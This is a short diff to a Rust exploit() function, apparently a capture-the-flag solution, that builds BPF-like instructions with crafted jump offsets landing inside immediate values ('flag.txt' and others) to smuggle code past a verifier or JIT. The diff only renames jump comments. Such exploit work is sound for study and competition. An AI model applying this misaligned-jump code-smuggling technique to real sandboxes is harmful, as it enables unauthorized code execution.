@@ -1162,14 +1162,12 @@ fn exploit() {
     add_immediate(&mut instructions, BpfRegT::R0, u64::from_le_bytes(*b"flag.txt"));
     add_immediate(&mut instructions, BpfRegT::R6, u64::from_le_bytes(*b"\01234567"));
 
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 4 + 1*2, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 4 + 1*2, imm: 0 }); // j6
 
-    // off: 5 2 10 2 bytes
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 }); // j3
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 }); // j4
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 }); // j5
 
-    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 });
     instructions.push(two_bytes.clone());
 
     // invalid jump goes here:
@@ -1185,15 +1183,13 @@ fn exploit() {
         add_immediate(&mut instructions, BpfRegT::R0, immediate);
     }
 
-    // JUMP0
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 8 + 1 + 4 + 10*2, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 8 + 1 + 4 + 10*2, imm: 0 }); // j2
 
     for _ in 0..8 {
         instructions.push(two_bytes.clone());
     }
 
-    // off: 2|5 2 10
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - 8 - 1 - 10*2, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - 8 - 1 - 10*2, imm: 0 }); // j1
 
     for _ in 0..4 {
         instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
